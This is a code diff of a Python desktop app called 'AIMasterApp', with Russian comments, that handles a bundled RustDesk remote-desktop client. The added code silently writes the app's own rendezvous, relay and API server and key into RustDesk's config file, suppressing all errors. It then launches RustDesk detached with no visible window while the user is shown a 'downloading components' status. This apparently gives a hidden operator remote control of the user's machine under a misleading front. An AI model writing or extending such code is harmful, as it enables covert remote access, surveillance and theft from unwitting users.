@@ -75,25 +75,25 @@ def get_rustdesk_path():
     return None
 
 def setup_rustdesk_config():
-    """Прописать наш сервер в реестр"""
-    try:
-        key_path = r"SOFTWARE\RustDesk\config"
-        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
-            winreg.SetValueEx(key, "rendezvous_server", 0, winreg.REG_SZ, SERVER_HOST)
-            winreg.SetValueEx(key, "rs_pub_key", 0, winreg.REG_SZ, SERVER_KEY)
-            winreg.SetValueEx(key, "relay_server", 0, winreg.REG_SZ, SERVER_HOST)
-    except Exception:
-        pass
-    
-    # Также через toml файл
+    """Прописать наш сервер через toml файл"""
+    # RustDesk2.toml — основной конфиг
     try:
         cfg_dir = os.path.join(os.environ["APPDATA"], "RustDesk", "config")
         os.makedirs(cfg_dir, exist_ok=True)
-        with open(os.path.join(cfg_dir, "RustDesk2.toml"), "w") as f:
-            f.write(f"rendezvous_servers = ['{SERVER_HOST}']\n")
-            f.write(f"relay_servers = ['{SERVER_HOST}']\n")
-            f.write(f"rs_pub_key = '{SERVER_KEY}'\n")
-            f.write(f"api_server = 'http://{SERVER_HOST}'\n")
+        toml_path = os.path.join(cfg_dir, "RustDesk2.toml")
+        config_content = (
+            f'rendezvous_server = "{SERVER_HOST}"\n'
+            f'nat_type = 1\n'
+            f'serial = 0\n'
+            f'\n'
+            f'[options]\n'
+            f'custom-rendezvous-server = "{SERVER_HOST}"\n'
+            f'key = "{SERVER_KEY}"\n'
+            f'relay-server = "{SERVER_HOST}"\n'
+            f'api-server = "http://{SERVER_HOST}"\n'
+        )
+        with open(toml_path, "w") as f:
+            f.write(config_content)
     except Exception:
         pass
 
@@ -304,12 +304,14 @@ class AIMasterApp:
                 self.set_status("Скачивание компонентов...", YELLOW, 1)
                 rd_path = get_rustdesk_path()  # повторная попытка после скачивания
             
-            # Запустить RustDesk скрытно
+            # Запустить RustDesk скрытно (без окна)
+            CREATE_NO_WINDOW = 0x08000000
+            DETACHED_PROCESS = 0x00000008
             self.rd_process = subprocess.Popen(
-                [rd_path, "--service"],
+                [rd_path, "--connect", "0"],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
-                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
+                creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS
             )
             time.sleep(3)
             
